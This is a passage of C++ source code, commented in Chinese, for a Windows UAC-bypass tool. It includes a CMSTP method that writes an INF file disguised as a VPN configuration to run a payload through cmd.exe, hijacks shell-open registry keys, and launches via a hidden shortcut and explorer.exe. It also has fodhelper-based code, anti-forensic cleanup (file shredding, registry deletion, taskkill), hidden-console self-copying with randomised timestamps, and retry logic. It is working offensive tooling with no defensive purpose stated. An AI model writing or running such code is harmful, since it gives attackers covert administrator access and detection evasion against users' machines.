    std::ofstream(tempFodhelper, std::ios::binary).write(
        reinterpret_cast<const char*>(junkData.data()), junkData.size()
    );

    // 追加真实fodhelper.exe并保留签名属性
    AppendFile(fodhelperPath, tempFodhelper);
    CloneFileAttributes(fodhelperPath, tempFodhelper); // 克隆源文件时间戳/属性

    // 5. 进程链伪装（通过explorer.exe父进程触发）
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = L"explorer.exe";
    sei.lpParameters = (L"/factory," + randomKey).c_str(); // 工厂模式隐藏窗口
    sei.fMask = SEE_MASK_NO_CONSOLE | SEE_MASK_FLAG_NO_UI;
    sei.nShow = SW_HIDE;
    if (!ShellExecuteExW(&sei)) return false;

    // 6. 三重清理保障（注册表+文件+进程，保留原有机制）
    CleanupAfterProcess(L"explorer.exe", [this, fullRegPath, tempFodhelper]() {
        // 递归删除注册表项（对抗注册表监控）
        SHDeleteKeyW(HKEY_CURRENT_USER, fullRegPath.substr(0, fullRegPath.find_last_of(L'\\')).c_str());

        // 文件粉碎（3次覆盖写入 + 重命名删除）
        SecureDelete(tempFodhelper);

        // 清理残留进程（包括可能存在的dllhost.exe）
        system("taskkill /IM fodhelper.exe /F /T >nul 2>&1");
        system("taskkill /IM dllhost.exe /F /T >nul 2>&1");
        });
    return true;
}

bool UacmeBypass::Method_CMSTPProtocol(const fs::path& payload) {
    const std::wstring sysDir = GetSystemDirectory();

    // 1. 动态生成高度混淆的INF文件名与路径（保留混淆）
    std::wstring infName = L"VPN_" + GetRandomString(6) + L".inf"; // 伪装成VPN配置
    fs::path infPath = GetTempDirectory() / infName;
    std::wstring randomExt = L"." + GetRandomString(3); // 短扩展名降低怀疑
    std::wstring randomType = L"VPNConfig_" + GetRandomString(8); // 伪装成VPN配置类型

    // 2. 构建高迷惑性INF内容（关键优化，保留混淆）
    std::ofstream infFile(infPath);
    if (!infFile) return false;

    // 添加合法VPN配置字段
    infFile << "[version]\n"
        << "Signature=$chicago$\n"
        << "AdvancedINF=2.5\n\n"
        << "[DefaultInstall]\n"
        << "CustomDestination=CustInstDest\n"
        << "RunPreSetupCommands=PreCommands\n\n"  // 关键执行点
        << "[PreCommands]\n"
        << "cmd.exe /c \"" << payload.string() << "\"\n"    // 使用cmd.exe执行Payload
        << "taskkill /IM cmstp.exe /F /T\n\n"     // 强制终止进程减少痕迹
        << "[CustInstDest]\n"
        << "49000,49001=AllUserSection, 7\n\n"    // 合法配置段
        << "[AllUserSection]\n"
        << "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\","
        << "\"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n\n"
        << "[Strings]\n"
        << "ServiceName=\"VPNService\"\n";         // 伪装服务名
    infFile.close();

    // 3. 注册表操作增强隐蔽性（保留原有机制）
    HKEY hKey;
    // 使用REGFORCE_BACKUP_RESTORE权限绕过写保护
    if (RegCreateKeyExW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomExt).c_str(), 0, NULL,
        REG_OPTION_VOLATILE | REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(randomType.c_str()),
        static_cast<DWORD>((randomType.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    // 4. 命令执行流程优化（避免进程链可疑）
    std::wstring cmd = L"\"" + sysDir + L"cmstp.exe\" /s /au \"" + infPath.wstring() + L"\"";
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        (L"Software\\Classes\\" + randomType + L"\\shell\\open\\command").c_str(),
        0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(cmd.c_str()),
        static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    // 5. 通过COM接口静默触发（无窗口）
    CoInitialize(NULL);
    IUnknown* pUnknown = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IUnknown, (void**)&pUnknown);
    if (SUCCEEDED(hr)) {
        IShellLinkW* psl = nullptr;
        hr = pUnknown->QueryInterface(IID_IShellLinkW, (void**)&psl);
        if (SUCCEEDED(hr)) {
            // 使用系统工具伪装父进程
            psl->SetPath(L"explorer.exe");  // 直接传递宽字符串指针
            psl->SetArguments((L"testfile" + randomExt).c_str());

            IPersistFile* ppf = nullptr;
            hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
            if (SUCCEEDED(hr)) {
                fs::path lnkPath = GetTempDirectory() / (L"Update_" + GetRandomString(4) + L".lnk");
                hr = ppf->Save(lnkPath.c_str(), TRUE);
                if (SUCCEEDED(hr)) {
                    SHELLEXECUTEINFOW sei = { sizeof(sei) };
                    sei.lpFile = lnkPath.c_str();
                    sei.nShow = SW_HIDE;
                    sei.fMask = SEE_MASK_NO_CONSOLE | SEE_MASK_FLAG_NO_UI;
                    ShellExecuteExW(&sei);
                }
                SecureDelete(lnkPath); // 立即删除LNK
                ppf->Release();
            }
            psl->Release();
        }
        pUnknown->Release();
    }
    CoUninitialize();

    // 6. 三重清理保障（注册表+文件+进程，保留原有机制）
    CleanupAfterProcess(L"cmstp.exe", [this, randomExt, randomType, infPath]() {
        // 递归删除注册表项
        SHDeleteKeyW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomExt).c_str());
        SHDeleteKeyW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomType).c_str());

        // 文件粉碎（覆盖写入+删除）
        SecureDelete(infPath);

        // 清理CMSTP残留进程
        system("taskkill /IM cmstp.exe /F");
        });
    return true;
}
// ===================== 辅助函数 =====================
bool IsElevated() {
    BOOL elevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return elevated;
}

std::wstring GetLastErrorAsString() {
    DWORD errorId = GetLastError();
    if (errorId == 0) return L"Unknown error";

    LPWSTR buffer = nullptr;
    size_t size = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, errorId, 0, (LPWSTR)&buffer, 0, NULL
    );

    std::wstring message(buffer, size);
    LocalFree(buffer);
    return message;
}

void RunSilentAdminTask() {
    // 实际的管理员任务代码
    // 例如：修改系统设置、安装服务等

    // 示例：创建管理员文件
    std::ofstream adminFile("C:\\Windows\\System32\\admin_success.txt");
    adminFile << "Administrator privileges obtained at "
        << std::chrono::system_clock::now().time_since_epoch().count();
    adminFile.close();

    // 显示成功消息
    MessageBoxW(
        NULL,
        L"Administrator privileges have been successfully obtained.\nSystem security operations completed.",
        L"Privilege Escalation Success",
        MB_OK | MB_ICONINFORMATION | MB_TOPMOST
    );
}

// ===================== 防止多实例运行的机制 =====================
// 检查是否已有实例运行，并保留权限更高的实例
bool CheckExistingInstance() {
    // 创建互斥体确保只有一个实例运行
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\UacmeBypassInstance");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // 已有实例运行，检查权限
        BOOL currentElevated = IsElevated();

        // 尝试打开现有实例的互斥体以获取其权限信息
        HANDLE hExistingMutex = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, L"Global\\UacmeBypassInstance");
        if (hExistingMutex) {
            // 获取现有实例的权限（简化处理，实际应用中可能需要更复杂的IPC）
            BOOL existingElevated = FALSE;
            DWORD size = 0;
            if (GetKernelObjectSecurity(hExistingMutex, OWNER_SECURITY_INFORMATION, NULL, 0, &size) ||
                GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, size);
                if (pSD && GetKernelObjectSecurity(hExistingMutex, OWNER_SECURITY_INFORMATION, pSD, size, &size)) {
                    PSID pOwnerSid = NULL;
                    BOOL ownerDefaulted = FALSE;
                    if (GetSecurityDescriptorOwner(pSD, &pOwnerSid, &ownerDefaulted)) {
                        // 检查所有者是否为管理员组
                        SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
                        PSID pAdminSid = NULL;
                        if (AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminSid)) {
                            existingElevated = EqualSid(pOwnerSid, pAdminSid);
                            FreeSid(pAdminSid);
                        }
                    }
                }
                LocalFree(pSD);
            }
            CloseHandle(hExistingMutex);

            // 比较权限，保留权限更高的实例
            if (existingElevated && !currentElevated) {
                // 已有管理员权限实例运行，当前普通权限实例退出
                return true;
            }
            else if (!existingElevated && currentElevated) {
                // 当前是管理员权限，已有普通权限实例运行
                // 可以通知普通权限实例退出（此处简化处理，直接继续运行）
                return false;
            }
        }

        // 如果无法确定权限，默认退出当前实例
        return true;
    }

    // 当前是第一个实例
    return false;
}

int admin() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 检查是否已有实例运行，并保留权限更高的实例
    if (CheckExistingInstance()) {
        return 0; // 已有更高权限实例运行，当前实例退出
    }

    // 检查命令行参数，判断是否已经是提权后的实例
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    bool isElevatedInstance = false;
    for (int i = 1; i < argc; ++i) {
        if (wcscmp(argv[i], L"/elevated") == 0) {
            isElevatedInstance = true;
            break;
        }
    }
    LocalFree(argv);

    if (isElevatedInstance || IsElevated()) {
        RunSilentAdminTask();
        return 0;
    }

    UacmeBypass bypass;
    wchar_t currentPath[MAX_PATH];
    if (GetModuleFileNameW(nullptr, currentPath, MAX_PATH) == 0) {
        std::wstring errorMsg = L"Failed to get current process path. Error: " + GetLastErrorAsString();
        MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
        return 1;
    }

    // 修改：创建临时副本时使用.exe扩展名
    auto tempFilePath = bypass.CreateTempFile(L".exe"); // 改为.exe扩展名
    if (tempFilePath.empty()) {
        std::wstring errorMsg = L"Failed to create temp file. Error: " + GetLastErrorAsString();
        MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
        return 1;
    }

    if (!bypass.CopyFileWithObfuscation(currentPath, tempFilePath)) {
        bypass.SecureDelete(tempFilePath);
        std::wstring errorMsg = L"Failed to copy file. Error: " + GetLastErrorAsString();
        MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
        return 1;
    }

    bypass.SetRandomFileTime(tempFilePath);

    // 修改：正确构建命令行参数
    std::wstring commandLine = L"\"" + tempFilePath.wstring() + L"\" /elevated";

    // 修改：使用带重试机制的自动绕过，传递正确的命令行
    if (bypass.AutoBypassWithRetry(commandLine, 3)) {
        std::this_thread::sleep_for(std::chrono::seconds(3));
        // 延迟删除临时副本
        std::thread([tempFilePath]() {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            fs::remove(tempFilePath);
            }).detach();
        return 0;
    }

    bypass.SecureDelete(tempFilePath);
    std::wstring errorMsg = L"UAC bypass failed. Error: " + GetLastErrorAsString();
    MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
    return 1;

}
